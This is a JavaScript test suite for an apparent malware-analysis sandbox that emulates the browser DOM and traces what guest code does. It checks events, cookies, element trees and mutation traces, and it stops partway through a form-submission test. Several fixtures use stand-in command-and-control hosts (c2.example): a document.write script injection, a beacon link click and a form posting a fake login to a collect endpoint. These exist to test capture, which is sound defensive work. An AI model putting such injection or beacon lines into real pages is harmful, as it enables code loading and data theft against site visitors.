import test from 'node:test'
import assert from 'node:assert/strict'

import { createHarness } from './helpers/harness.js'
import { installEnvironment } from '../tools/sandbox/env/index.js'

const MODULES = ['globals', 'console', 'dom']

/**
 * Evaluate guest code and fail the test with the guest error when it throws.
 * @param {object} harness
 * @param {string} source
 */
function run(harness, source) {
  const result = harness.run(source)
  if (!result.ok) throw new Error(`guest threw: ${JSON.stringify(result.error)}`)
  return result.value
}

/**
 * Evaluate guest code that must produce a live handle (for bridge APIs).
 * @param {object} harness
 * @param {string} source
 */
function guestHandle(harness, source) {
  const result = harness.ctx.evalCode(source, 'https://example.test/probe.js')
  if (result.error) {
    const dumped = harness.ctx.dump(result.error)
    result.error.dispose()
    throw new Error(`guest eval failed: ${JSON.stringify(dumped)}`)
  }
  return result.value
}

test('event constructors are guest-native and carry the browser fields', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [
      type,
      eventInstance,
      mouseInstance,
      detail,
      mouseField,
      key,
      data,
      message,
      reason,
      cancelable,
      trusted,
      arity,
    ] = run(
      harness,
      `[
        new Event('click').type,
        new Event('click') instanceof Event,
        new MouseEvent('m') instanceof Event,
        new CustomEvent('c', { detail: 41 }).detail,
        new MouseEvent('m', { clientX: 12, button: 2 }).clientX,
        new KeyboardEvent('k', { key: 'Enter' }).key,
        new MessageEvent('msg', { data: 'payload' }).data,
        new ErrorEvent('err', { message: 'boom', lineno: 3 }).message,
        new PromiseRejectionEvent('unhandledrejection', { reason: 42 }).reason,
        new Event('x', { bubbles: true, cancelable: true }).cancelable,
        new Event('x').isTrusted,
        Event.length,
      ]`,
    )
    assert.equal(type, 'click')
    assert.equal(eventInstance, true, 'new Event(...) instanceof Event')
    assert.equal(mouseInstance, true, 'MouseEvent extends Event')
    assert.equal(detail, 41)
    assert.equal(mouseField, 12)
    assert.equal(key, 'Enter')
    assert.equal(data, 'payload')
    assert.equal(message, 'boom')
    assert.equal(reason, 42)
    assert.equal(cancelable, true)
    assert.equal(trusted, false)
    assert.equal(arity, 2)
  } finally {
    harness.dispose()
  }
})

test('event constructors and document.constructor stringify as native code', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [ctor, method, documentCtor] = run(
      harness,
      `[String(Event), Event.prototype.preventDefault.toString(), String(document.constructor)]`,
    )
    assert.match(ctor, /native code/, 'String(Event) is native')
    assert.match(method, /native code/, 'Event.prototype.preventDefault is native')
    assert.match(documentCtor, /native code/, 'document.constructor is native')
  } finally {
    harness.dispose()
  }
})

test('dispatchEvent runs listeners in order and honours once', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const hits = run(
      harness,
      `window.__hits = [];
       function record(label) {
         return function (event) { window.__hits.push(label + ':' + event.type + ':' + (event.target === window)) };
       }
       window.addEventListener('ping', record('a'));
       window.addEventListener('ping', record('b'), { once: true });
       window.dispatchEvent(new Event('ping'));
       window.dispatchEvent(new Event('ping'));
       window.__hits.join('|');`,
    )
    assert.equal(hits, 'a:ping:true|b:ping:true|a:ping:true')

    const [onClickCount, onClickTarget, onClickType] = run(
      harness,
      `window.__onclick = 0;
       window.onclick = function (event) { window.__onclick += 1; window.__clickTarget = event.target === window };
       window.dispatchEvent(new MouseEvent('click'));
       [window.__onclick, window.__clickTarget, typeof window.onclick];`,
    )
    assert.equal(onClickCount, 1)
    assert.equal(onClickTarget, true)
    assert.equal(onClickType, 'function')

    const order = run(
      harness,
      `var order = [];
       document.addEventListener('x', function () { order.push('capture') }, true);
       document.addEventListener('x', function () { order.push('bubble') });
       document.dispatchEvent(new Event('x'));
       order.join(',');`,
    )
    assert.equal(order, 'capture,bubble')

    const reentrant = run(
      harness,
      `var log = [];
       var second = function () { log.push('second') };
       window.addEventListener('outer', function () {
         log.push('outer');
         window.dispatchEvent(new Event('inner'));
         window.removeEventListener('outer', second);
       });
       window.addEventListener('outer', second);
       window.addEventListener('inner', function () { log.push('inner') });
       window.dispatchEvent(new Event('outer'));
       log.join(',');`,
    )
    assert.equal(reentrant, 'outer,inner', 'nested dispatch and mid-dispatch removal are safe')

    const unrelated = run(
      harness,
      `var fired = [];
       window.addEventListener('typed', function () { fired.push('typed') });
       window.dispatchEvent(new Event('other'));
       window.dispatchEvent(new Event('typed'));
       fired.join(',');`,
    )
    assert.equal(unrelated, 'typed', 'listeners only receive their own event type')
  } finally {
    harness.dispose()
  }
})

test('removeEventListener stops delivery and listener objects are supported', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [count, seen] = run(
      harness,
      `var count = 0;
       var listener = function () { count += 1 };
       var object = { handleEvent: function (event) { count += 10; this.seen = event.type } };
       window.addEventListener('tick', listener);
       window.addEventListener('tick', object);
       window.dispatchEvent(new Event('tick'));
       window.removeEventListener('tick', listener);
       window.dispatchEvent(new Event('tick'));
       [count, object.seen];`,
    )
    assert.equal(count, 21, 'listener (1) and handleEvent object (10) ran once each')
    assert.equal(seen, 'tick')
  } finally {
    harness.dispose()
  }
})

test('bridge.dispatchEvent delivers guest events and records listener errors', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    run(
      harness,
      `window.__dispatched = 0;
       window.__afterThrow = false;
       window.addEventListener('from-host', function () { window.__dispatched += 1 });
       window.addEventListener('from-host', function () { throw new Error('listener exploded') });
       window.addEventListener('from-host', function () { window.__afterThrow = true });`,
    )
    const event = guestHandle(harness, "new Event('from-host')")
    const notCancelled = harness.bridge.dispatchEvent(harness.bridge.global, event)
    event.dispose()

    assert.equal(notCancelled, true, 'a throwing listener does not cancel the event')
    assert.equal(run(harness, 'window.__dispatched'), 1)
    assert.equal(run(harness, 'window.__afterThrow'), true, 'later listeners still run')

    const exceptions = harness.trace.events.filter(
      (entry) => entry.kind === 'exception' && entry.origin === 'listener',
    )
    assert.equal(exceptions.length, 1)
    assert.equal(exceptions[0].eventType, 'from-host')
    assert.match(String(exceptions[0].message), /listener exploded/)
    assert.doesNotMatch(String(exceptions[0].stack ?? ''), /tools\/sandbox/)
  } finally {
    harness.dispose()
  }
})

test('document exposes the browser surface and empty query collections', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [
      nodeType,
      documentElement,
      head,
      body,
      bodyParent,
      readyState,
      referrer,
      domain,
      characterSet,
      charset,
      contentType,
      compatMode,
      visibilityState,
      hidden,
      hasFocus,
      execCommand,
      scripts,
      forms,
      imageItem,
      byTag,
      byId,
      queried,
      lastModified,
      currentScriptSrc,
    ] = run(
      harness,
      `[
        document.nodeType,
        document.documentElement.tagName,
        document.head.tagName,
        document.body.tagName,
        document.body.parentNode === document.documentElement,
        document.readyState,
        document.referrer,
        document.domain,
        document.characterSet,
        document.charset,
        document.contentType,
        document.compatMode,
        document.visibilityState,
        document.hidden,
        document.hasFocus(),
        document.execCommand('copy'),
        document.scripts.length,
        document.forms.length,
        document.images.item(0),
        document.getElementsByTagName('script').length,
        document.getElementById('nope'),
        document.querySelector('.nope'),
        document.lastModified.length > 0,
        document.currentScript.src,
      ]`,
    )
    assert.equal(nodeType, 9)
    assert.equal(documentElement, 'HTML')
    assert.equal(head, 'HEAD')
    assert.equal(body, 'BODY')
    assert.equal(bodyParent, true)
    assert.equal(readyState, 'complete')
    assert.equal(referrer, '')
    assert.equal(domain, 'www.example-cdn.com')
    assert.equal(characterSet, 'UTF-8')
    assert.equal(charset, 'UTF-8')
    assert.equal(contentType, 'text/html')
    assert.equal(compatMode, 'CSS1Compat')
    assert.equal(visibilityState, 'visible')
    assert.equal(hidden, false)
    assert.equal(hasFocus, true)
    assert.equal(execCommand, false)
    assert.equal(scripts, 0)
    assert.equal(forms, 0)
    assert.equal(imageItem, null)
    assert.equal(byTag, 0)
    assert.equal(byId, null)
    assert.equal(queried, null)
    assert.equal(lastModified, true)
    assert.equal(run(harness, 'document.URL'), harness.profile.href)
    assert.equal(run(harness, 'document.documentURI'), harness.profile.href)
    assert.equal(currentScriptSrc, harness.profile.href)

    const descriptors = run(harness, `[Object.keys(window).indexOf('document') >= 0, (function () {
      try { document = 5 } catch (error) { /* non-writable */ }
      return document === window.document
    })()]`)
    assert.deepEqual(descriptors, [true, true], 'window.document is enumerable and non-writable')
  } finally {
    harness.dispose()
  }
})

test('document.cookie round-trips and strips attributes', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const jar = run(
      harness,
      `document.cookie = 'session=abc123; path=/; domain=www.example-cdn.com; expires=Wed, 01 Jan 2031 00:00:00 GMT';
       document.cookie = 'theme=dark';
       document.cookie = 'sid=1; secure; httponly';
       document.cookie = 'gone=1; expires=Thu, 01 Jan 1970 00:00:00 GMT';
       document.cookie;`,
    )
    assert.equal(jar, 'session=abc123; theme=dark; sid=1')

    const writes = harness.trace.events.filter(
      (entry) => entry.kind === 'storage' && entry.api === 'document.cookie' && entry.action === 'set',
    )
    assert.ok(writes.length >= 3, 'cookie writes are traced')
    assert.equal(writes[0].name, 'session')
    assert.equal(writes[0].domain, 'www.example-cdn.com')
    assert.equal(writes[0].path, '/')
    assert.equal(writes[2].secure, true)
    assert.equal(writes[2].httpOnlyIgnored, true, 'HttpOnly is stripped for script writes')

    // Expiry is measured on the virtual clock, never on host time.
    const beforeExpiry = run(harness, `document.cookie = 'short=1; max-age=1'; document.cookie;`)
    assert.match(beforeExpiry, /short=1/)
    harness.clock.advance(2000)
    assert.doesNotMatch(run(harness, 'document.cookie;'), /short=1/)
  } finally {
    harness.dispose()
  }
})

test('secure cookies are ignored on an http profile', async () => {
  // `createProfile` derives `href` from `host` and hard-codes https, so the
  // http page is composed here: install the document against a mutated profile.
  const harness = await createHarness({ modules: ['globals', 'console'] })
  try {
    harness.profile.href = 'http://x/'
    harness.profile.host = 'x'
    harness.env = await installEnvironment(harness.bridge, { only: ['dom'], strict: false })
    const [jar, url, domain] = run(
      harness,
      `document.cookie = 'sid=1; secure';
       document.cookie = 'plain=1';
       [document.cookie, document.URL, document.domain];`,
    )
    assert.equal(jar, 'plain=1')
    assert.equal(url, 'http://x/')
    assert.equal(domain, 'x')

    const ignored = harness.trace.events.filter(
      (entry) => entry.kind === 'storage' && entry.action === 'ignore' && entry.reason === 'secure-context',
    )
    assert.equal(ignored.length, 1)
    assert.equal(ignored[0].name, 'sid')
  } finally {
    harness.dispose()
  }
})

test('createElement builds a usable element tree', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [
      nodeType,
      tagName,
      nodeName,
      childCount,
      nodeCount,
      rectNonZero,
      offsetNonZero,
      display,
      styleLength,
      color,
      hasActive,
      classValue,
      id,
      className,
      textContent,
      childParent,
      parentIsBody,
      datasetIsObject,
      attachShadow,
      queried,
      cssText,
    ] = run(
      harness,
      `var div = document.createElement('div');
       div.id = 'box';
       div.className = 'a b';
       div.style.setProperty('display', 'flex');
       div.style.setProperty('color', 'red');
       div.classList.toggle('active');
       div.textContent = 'hello';
       var child = document.createElement('span');
       document.body.appendChild(div);
       div.appendChild(child);
       var rect = div.getBoundingClientRect();
       [div.nodeType,
         div.tagName,
         div.nodeName,
         div.children.length,
         div.childNodes.length,
         rect.width > 0 && rect.height > 0,
         div.offsetWidth > 0,
         div.style.getPropertyValue('display'),
         div.style.length,
         div.style.getPropertyValue('color'),
         div.classList.contains('active'),
         div.classList.value,
         div.id,
         div.className,
         div.textContent,
         child.parentNode === div,
         div.parentNode === document.body,
         div.dataset instanceof Object,
         typeof div.attachShadow,
         div.querySelectorAll('.nope').length,
         div.style.cssText];`,
    )
    assert.equal(nodeType, 1)
    assert.equal(tagName, 'DIV')
    assert.equal(nodeName, 'DIV')
    assert.equal(childCount, 1)
    assert.equal(nodeCount, 1)
    assert.equal(rectNonZero, true, 'rect is non-zero')
    assert.equal(offsetNonZero, true)
    assert.equal(display, 'flex')
    assert.equal(styleLength, 2)
    assert.equal(color, 'red')
    assert.equal(hasActive, true)
    assert.equal(classValue, 'a b active')
    assert.equal(id, 'box')
    assert.equal(className, 'a b active')
    assert.equal(textContent, 'hello')
    assert.equal(childParent, true)
    assert.equal(parentIsBody, true)
    assert.equal(datasetIsObject, true)
    assert.equal(attachShadow, 'undefined')
    assert.equal(queried, 0)
    assert.equal(cssText, 'display: flex; color: red;')

    const [remaining, removedParent, cloneChildren, cloneTag] = run(
      harness,
      `var box = document.createElement('div');
       var first = document.createElement('b');
       box.appendChild(first);
       box.appendChild(document.createElement('i'));
       var removed = box.removeChild(first);
       var clone = box.cloneNode(true);
       [box.children.length, removed.parentNode === null, clone.children.length, clone.tagName];`,
    )
    assert.equal(remaining, 1)
    assert.equal(removedParent, true)
    assert.equal(cloneChildren, 1)
    assert.equal(cloneTag, 'DIV')
  } finally {
    harness.dispose()
  }
})

test('createElement consults bridge.elementFactories first', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    // Factories receive the `createElement` options as a guest handle.
    harness.bridge.elementFactories.set('canvas', (options) =>
      harness.bridge.obj({
        nodeType: 1,
        tagName: 'CANVAS',
        fromFactory: true,
        width: harness.bridge.get(options, 'width') ?? 300,
      }),
    )
    const [tagName, fromFactory, defaultWidth, givenWidth] = run(
      harness,
      `var canvas = document.createElement('canvas');
       var sized = document.createElement('canvas', { width: 64 });
       [canvas.tagName, canvas.fromFactory, canvas.width, sized.width];`,
    )
    assert.equal(tagName, 'CANVAS')
    assert.equal(fromFactory, true)
    assert.equal(defaultWidth, 300)
    assert.equal(givenWidth, 64)
  } finally {
    harness.dispose()
  }
})

test('document.write is traced and truncated, getComputedStyle is style-like', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    run(harness, `document.write('<script src="https://c2.example.org/p.js"></script>')`)
    const shortWrite = harness.trace.events.filter((entry) => entry.api === 'document.write').pop()
    assert.ok(shortWrite, 'document.write emits a trace event')
    assert.equal(shortWrite.kind, 'dom')
    assert.match(String(shortWrite.text), /c2\.example\.org/)

    run(harness, `document.write('x'.repeat(5000))`)
    const longWrite = harness.trace.events.filter((entry) => entry.api === 'document.write').pop()
    assert.equal(longWrite.text.length, 2048, 'written text is truncated')
    assert.equal(longWrite.length, 5000)

    const [display, unknown, hasScrollTo, hasAddEventListener] = run(
      harness,
      `var style = window.getComputedStyle(document.createElement('div'));
       [style.getPropertyValue('display'),
        style.getPropertyValue('made-up-property'),
        typeof window.scrollTo,
        typeof window.addEventListener];`,
    )
    assert.equal(display, 'block')
    assert.equal(unknown, '')
    assert.equal(hasScrollTo, 'function')
    assert.equal(hasAddEventListener, 'function')

    const [sameDocument, selectionType, closeReturns] = run(
      harness,
      `[document.open() === document, document.getSelection().type, typeof document.close()];`,
    )
    assert.equal(sameDocument, true, 'document.open() returns the same document')
    assert.equal(selectionType, 'None')
    assert.equal(closeReturns, 'undefined')
  } finally {
    harness.dispose()
  }
})

test('document.createEvent builds an initialisable event', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [type, bubbles, isEvent] = run(
      harness,
      `var evt = document.createEvent('Event');
       evt.initEvent('ready', true, false);
       [evt.type, evt.bubbles, evt.constructor === Event];`,
    )
    assert.equal(type, 'ready')
    assert.equal(bubbles, true)
    assert.equal(isEvent, true)
  } finally {
    harness.dispose()
  }
})

test('no host leakage is visible in the guest realm', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const leaks = run(
      harness,
      `[typeof process, typeof require, typeof Buffer, typeof module, typeof global, typeof window.__pwInitScripts];`,
    )
    assert.deepEqual(leaks, ['undefined', 'undefined', 'undefined', 'undefined', 'undefined', 'undefined'])
  } finally {
    harness.dispose()
  }
})

test('geometry and URLs are deterministic for a fixed profile and seed', async () => {
  const first = await createHarness({ modules: MODULES })
  const second = await createHarness({ modules: MODULES })
  try {
    const probe = `(function () {
      var element = document.createElement('div')
      var rect = element.getBoundingClientRect()
      return [rect.width, rect.height, rect.left, rect.top, document.URL, document.domain]
    })()`
    assert.deepEqual(run(first, probe), run(second, probe))
  } finally {
    first.dispose()
    second.dispose()
  }
})

test('the DOM module alone installs the interface hierarchy', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [
      missing,
      chains,
      instances,
      brands,
      owns,
      structuralHooks,
      constructed,
      perInstance,
      nativeSources,
    ] = run(
      harness,
      `(function () {
        var REQUIRED = ['EventTarget', 'Node', 'Element', 'CharacterData', 'Text', 'Comment',
          'DocumentFragment', 'DocumentType', 'Document', 'NodeList', 'HTMLCollection',
          'DOMTokenList', 'CSSStyleDeclaration', 'HTMLElement', 'HTMLDivElement'];
        function linked(list) {
          for (var index = 0; index < list.length - 1; index += 1) {
            if (Object.getPrototypeOf(list[index].prototype) !== list[index + 1].prototype) return false;
          }
          return Object.getPrototypeOf(list[list.length - 1].prototype) === Object.prototype;
        }
        var div = document.createElement('div');
        var text = document.createTextNode('x');
        var fragment = document.createDocumentFragment();
        var list = document.querySelectorAll('div');
        var first = document.createElement('div');
        var second = document.createElement('div');
        first.id = 'first';
        first.classList.add('a');
        return [
          REQUIRED.filter(function (name) { return typeof globalThis[name] !== 'function' }),
          {
            element: linked([HTMLDivElement, HTMLElement, Element, Node, EventTarget]),
            text: linked([Text, CharacterData, Node, EventTarget]),
            fragment: linked([DocumentFragment, Node, EventTarget]),
            document: linked([HTMLDocument, Document, Node, EventTarget]),
            nodeList: linked([NodeList]),
            tokenList: linked([DOMTokenList]),
            style: linked([CSSStyleDeclaration]),
          },
          {
            divElement: div instanceof Element,
            divNode: div instanceof Node,
            divEventTarget: div instanceof EventTarget,
            divHTMLElement: div instanceof HTMLElement,
            divIsDiv: div instanceof HTMLDivElement,
            spanNotDiv: !(document.createElement('span') instanceof HTMLDivElement),
            bodyBody: document.body instanceof HTMLBodyElement,
            documentDocument: document instanceof Document,
            documentNode: document instanceof Node,
            textText: text instanceof Text,
            textCharacterData: text instanceof CharacterData,
            fragmentFragment: fragment instanceof DocumentFragment,
            nodeList: list instanceof NodeList,
            collection: document.getElementsByTagName('div') instanceof HTMLCollection,
            tokenList: div.classList instanceof DOMTokenList,
            style: div.style instanceof CSSStyleDeclaration,
            shimCanvas: document.createElement('canvas') instanceof HTMLCanvasElement,
          },
          {
            div: Object.prototype.toString.call(div),
            text: Object.prototype.toString.call(text),
            document: Object.prototype.toString.call(document),
            list: Object.prototype.toString.call(list),
            style: Object.prototype.toString.call(div.style)
          },
          {
            keys: Object.keys(div).length,
            names: Object.getOwnPropertyNames(div).length,
            symbols: Object.getOwnPropertySymbols(div).length,
            textKeys: Object.keys(text).length
          },
          [Element, Node, HTMLElement, HTMLDivElement, Text, Document, NodeList]
            .filter(function (ctor) { return Object.getOwnPropertyDescriptor(ctor, Symbol.hasInstance) !== undefined }).length,
          (function () { try { new Node() } catch (error) { return error.name } return 'constructed' })(),
          {
            ids: first.id !== second.id,
            classes: first.classList.length === 1 && second.classList.length === 0,
            style: first.style !== second.style,
            children: first.childNodes !== second.childNodes,
            childNodesIsNodeList: first.childNodes instanceof NodeList,
            childrenIsCollection: first.children instanceof HTMLCollection,
            liveIndex: (function () {
              first.appendChild(document.createElement('b'));
              var ok = first.childNodes.length === 1 && first.childNodes[0] === first.firstChild;
              first.removeChild(first.firstChild);
              return ok && first.childNodes.length === 0 && first.childNodes[0] === undefined;
            })(),
            notArray: !Array.isArray(first.childNodes) && !Array.isArray(first.children)
          },
          [Node, Element, HTMLElement, Text, Document, NodeList, CSSStyleDeclaration]
            .filter(function (ctor) { return !String(ctor).includes('native code') })
        ]
      })()`,
    )
    assert.deepEqual(missing, [], 'the DOM module must publish every interface')
    for (const [name, ok] of Object.entries(chains)) {
      assert.equal(ok, true, `${name}: interface prototypes must form the specified chain`)
    }
    for (const [name, ok] of Object.entries(instances)) {
      assert.equal(ok, true, `${name}: instanceof must hold`)
    }
    assert.deepEqual(brands, {
      div: '[object HTMLDivElement]',
      text: '[object Text]',
      document: '[object HTMLDocument]',
      list: '[object NodeList]',
      style: '[object CSSStyleDeclaration]',
    })
    assert.deepEqual(owns, { keys: 0, names: 0, symbols: 0, textKeys: 0 })
    assert.equal(structuralHooks, 0, 'instanceof comes from the prototype chain only')
    assert.equal(constructed, 'TypeError')
    assert.deepEqual(perInstance, {
      ids: true,
      classes: true,
      style: true,
      children: true,
      childNodesIsNodeList: true,
      childrenIsCollection: true,
      liveIndex: true,
      notArray: true,
    })
    assert.deepEqual(nativeSources, [], 'interface constructors must stringify as native code')
  } finally {
    harness.dispose()
  }
})

/**
 * `XMLDocument extends Document` (residual): the hierarchy only had
 * `HTMLDocument`, so a parsed XML document was either branded
 * `[object XMLDocument]` while answering `instanceof HTMLDocument`, or it had
 * no interface at all. Both document kinds are Documents, and neither is the
 * other.
 */
test('XMLDocument is a Document subtype distinct from HTMLDocument', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [types, chains, instances, brands, illegal, nativeSources] = run(
      harness,
      `(function () {
        var created = document.implementation.createHTMLDocument('extra');
        return [
          { Document: typeof Document, HTMLDocument: typeof HTMLDocument, XMLDocument: typeof XMLDocument },
          {
            xmlBelowDocument: Object.getPrototypeOf(XMLDocument.prototype) === Document.prototype,
            htmlBelowDocument: Object.getPrototypeOf(HTMLDocument.prototype) === Document.prototype,
            distinct: XMLDocument.prototype !== HTMLDocument.prototype
          },
          {
            liveIsHTML: document instanceof HTMLDocument,
            liveIsDocument: document instanceof Document,
            liveNotXML: !(document instanceof XMLDocument),
            createdIsHTML: created instanceof HTMLDocument,
            createdIsDocument: created instanceof Document,
            createdNotXML: !(created instanceof XMLDocument)
          },
          {
            xml: Object.prototype.toString.call(XMLDocument.prototype),
            html: Object.prototype.toString.call(HTMLDocument.prototype),
            live: Object.prototype.toString.call(document),
            names: [Document.name, HTMLDocument.name, XMLDocument.name],
            xmlConstructor: XMLDocument.prototype.constructor === XMLDocument
          },
          {
            xml: (function () { try { new XMLDocument() } catch (error) { return error.name } return 'constructed' })(),
            html: (function () { try { new HTMLDocument() } catch (error) { return error.name } return 'constructed' })()
          },
          [Document, HTMLDocument, XMLDocument].filter(function (ctor) {
            return !String(ctor).includes('native code');
          })
        ]
      })()`,
    )
    assert.deepEqual(types, { Document: 'function', HTMLDocument: 'function', XMLDocument: 'function' })
    assert.deepEqual(chains, { xmlBelowDocument: true, htmlBelowDocument: true, distinct: true })
    assert.deepEqual(instances, {
      liveIsHTML: true,
      liveIsDocument: true,
      liveNotXML: true,
      createdIsHTML: true,
      createdIsDocument: true,
      createdNotXML: true,
    })
    assert.deepEqual(brands, {
      xml: '[object XMLDocument]',
      html: '[object HTMLDocument]',
      live: '[object HTMLDocument]',
      names: ['Document', 'HTMLDocument', 'XMLDocument'],
      xmlConstructor: true,
    })
    assert.deepEqual(illegal, { xml: 'TypeError', html: 'TypeError' })
    assert.deepEqual(nativeSources, [], 'interface constructors must stringify as native code')
  } finally {
    harness.dispose()
  }
})

test('real DOM mutations are traced with bounded, guest-attributed evidence', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    // Installing the DOM builds the initial document through the same setters a
    // guest uses; that construction is platform bookkeeping and must stay out of
    // the trace, or every inert sample would collect DOM evidence.
    assert.deepEqual(
      harness.trace.events.filter((event) => event.kind === 'dom' && event.op),
      [],
      'building the initial document is not a mutation of the sample',
    )

    const markup = '<form id="login"><input name="otp" value="SECRET-VALUE"></form>'
    const ownProperties = run(
      harness,
      `(function () {
        var overlay = document.createElement('div');
        overlay.id = 'overlay';
        overlay.innerHTML = ${JSON.stringify(markup)};
        overlay.textContent = 'SECRET-TEXT';
        overlay.setAttribute('data-stage', 'SECRET-VALUE');
        overlay.classList.add('hidden');
        var input = document.createElement('input');
        document.body.appendChild(overlay);
        overlay.appendChild(input);
        overlay.insertBefore(input, null);
        overlay.replaceChild(document.createElement('span'), input);
        overlay.classList.toggle('hidden');
        overlay.classList.remove('hidden');
        overlay.removeAttribute('data-stage');
        document.body.removeChild(overlay);
        return [Object.keys(overlay).length, Object.getOwnPropertyNames(overlay).length];
      })()`,
    )
    assert.deepEqual(ownProperties, [0, 0], 'a mutation never adds an own property to the instance')

    const mutations = harness.trace.events.filter((event) => event.kind === 'dom' && event.op)
    assert.deepEqual(
      mutations.map((event) => event.op),
      [
        'set innerHTML',
        'set textContent',
        'setAttribute',
        'classList.add',
        'appendChild',
        'appendChild',
        'insertBefore',
        'replaceChild',
        'classList.toggle',
        'classList.remove',
        'removeAttribute',
        'removeChild',
      ],
      'exactly one record per committed mutation, in order',
    )
    for (const event of mutations) {
      assert.equal(event.phase, 'emit')
      assert.equal(event.actor, 'instrumentation', 'a mutation is the guest reacting, not the platform installing')
      assert.equal(event.tracing, undefined)
    }

    const byOp = (op) => mutations.filter((event) => event.op === op)
    assert.equal(byOp('appendChild')[0].api, 'Node.appendChild')
    assert.equal(byOp('appendChild')[0].tag, 'body')
    assert.equal(byOp('appendChild')[0].child, 'div')
    assert.equal(byOp('appendChild')[1].tag, 'div')
    assert.equal(byOp('appendChild')[1].child, 'input')
    assert.equal(byOp('insertBefore')[0].before, '')
    assert.deepEqual([byOp('replaceChild')[0].child, byOp('replaceChild')[0].replaced], ['span', 'input'])
    assert.equal(byOp('removeChild')[0].tag, 'body')
    assert.equal(byOp('removeChild')[0].child, 'div')

    // Attribute writes name the attribute and never echo its value.
    assert.equal(byOp('setAttribute')[0].api, 'Element.setAttribute')
    assert.equal(byOp('setAttribute')[0].attribute, 'data-stage')
    assert.equal(byOp('setAttribute')[0].value, undefined)
    assert.equal(byOp('removeAttribute')[0].attribute, 'data-stage')

    // Text setters report the size of the write, not the write.
    const innerHTML = byOp('set innerHTML')[0]
    assert.equal(innerHTML.api, 'Element.innerHTML')
    assert.equal(innerHTML.tag, 'div')
    assert.equal(innerHTML.length, markup.length)
    assert.equal(innerHTML.text, undefined)
    assert.equal(byOp('set textContent')[0].api, 'Node.textContent')
    assert.equal(byOp('set textContent')[0].length, 'SECRET-TEXT'.length)

    // classList mutators name the attribute they change, never a token.
    for (const event of mutations.filter((entry) => entry.op.startsWith('classList.'))) {
      assert.equal(event.attribute, 'class')
      assert.equal(event.tag, 'div')
    }

    const serialized = JSON.stringify(mutations)
    assert.doesNotMatch(serialized, /SECRET/, 'no payload text may reach the trace')

    // The shim's own construction work runs through the same setters: a clone is
    // detached, and a fresh document belongs to the platform, so neither is
    // evidence about the sample.
    const beforeQuiet = harness.trace.events.filter((event) => event.kind === 'dom').length
    const quietShape = run(
      harness,
      `(function () {
        var host = document.createElement('div');
        host.setAttribute('data-a', '1');
        host.innerHTML = '<span>deep</span>';
        host.appendChild(document.createElement('b'));
        var copy = host.cloneNode(true);
        var fresh = document.implementation.createHTMLDocument();
        return [copy.childNodes.length, copy.getAttribute('data-a'), fresh.body.nodeName];
      })()`,
    )
    assert.deepEqual(quietShape, [1, '1', 'BODY'], 'cloning and document creation still work')
    const quietEvents = harness.trace.events.filter((event) => event.kind === 'dom').slice(beforeQuiet)
    assert.deepEqual(
      quietEvents.map((event) => event.api),
      ['Element.setAttribute', 'Element.innerHTML', 'Node.appendChild'],
      'the clone and the new document contribute no records of their own',
    )
  } finally {
    harness.dispose()
  }
})

// The default action of an `<a href>` click is a navigation. It is captured
// (one `net` request plus an IOC), never performed, and an empty or
// non-http(s) URL is not egress.
test('anchor click routes the resolved URL through the network service without navigating', async () => {
  const harness = await createHarness({ modules: [...MODULES, 'location', 'network'] })
  try {
    assert.equal(
      run(harness, `document.createElement('a').href`),
      '',
      'a fresh anchor has an empty href',
    )

    run(
      harness,
      `var link = document.createElement('a');
       link.href = 'https://c2.example/beacon';
       link.click();`,
    )

    const net = harness.trace.events.filter((event) => event.kind === 'net')
    assert.equal(net.length, 1, 'an anchor click is one captured request')
    assert.equal(net[0].method, 'GET')
    assert.equal(net[0].url, 'https://c2.example/beacon')

    const iocs = harness.trace.events.filter((event) => event.kind === 'ioc')
    assert.ok(
      iocs.some((event) => event.iocKind === 'url' && event.value === 'https://c2.example/beacon'),
      'the anchor target is reported as an IOC',
    )

    const writes = harness.trace.events.filter((event) => event.kind === 'dom' && event.op === 'set href')
    assert.equal(writes.length, 1, 'href writes are traced')
    assert.equal(writes[0].tag, 'a')
    assert.equal(writes[0].length, 'https://c2.example/beacon'.length)
    assert.doesNotMatch(JSON.stringify(writes), /c2\.example/, 'the trace keeps the length, not the URL')

    // Captured, not performed: the document URL never changes.
    assert.equal(run(harness, 'document.URL'), harness.profile.href)
    assert.equal(run(harness, 'location.href'), harness.profile.href)

    // A cancelled click has no default action; a relative href resolves
    // against the current document and a blob: URL is never sent.
    run(
      harness,
      `var blocked = document.createElement('a');
       blocked.href = 'https://c2.example/blocked';
       blocked.addEventListener('click', function (event) { event.preventDefault() });
       blocked.click();
       var relative = document.createElement('a');
       relative.href = '/stage2';
       relative.click();
       var blobLink = document.createElement('a');
       blobLink.href = 'blob:https://www.example-cdn.com/123';
       blobLink.click();`,
    )
    const after = harness.trace.events.filter((event) => event.kind === 'net').slice(1)
    assert.deepEqual(
      after.map((event) => event.url),
      [`${new URL('/', harness.profile.href).origin}/stage2`],
      'only the relative click reaches the network',
    )
  } finally {
    harness.dispose()
  }
})

test('form submit/requestSubmit expose the browser surface and capture the resolved action', async () => {
  const harness = await createHarness({ modules: [...MODULES, 'location', 'network'] })
  try {
    const surface = run(
      harness,
      `var form = document.createElement('form');
       ['action' in form, typeof form.action, typeof form.submit, typeof form.requestSubmit];`,
    )
    assert.deepEqual(surface, [true, 'string', 'function', 'function'])

    run(
      harness,
      `var form = document.createElement('form');
       form.action = 'https://c2.example/collect';
       form.submit();
       form.requestSubmit();`,
    )

    const net = harness.trace.events.filter((event) => event.kind === 'net')
    assert.deepEqual(
      net.map((event) => event.url),
      ['https://c2.example/collect', 'https://c2.example/collect'],
      'submit and requestSubmit each route the resolved action',
    )

    const iocs = harness.trace.events.filter((event) => event.kind === 'ioc')
    assert.equal(
      iocs.filter((event) => event.value === 'https://c2.example/collect').length,
      2,
      'each submission reports an IOC',
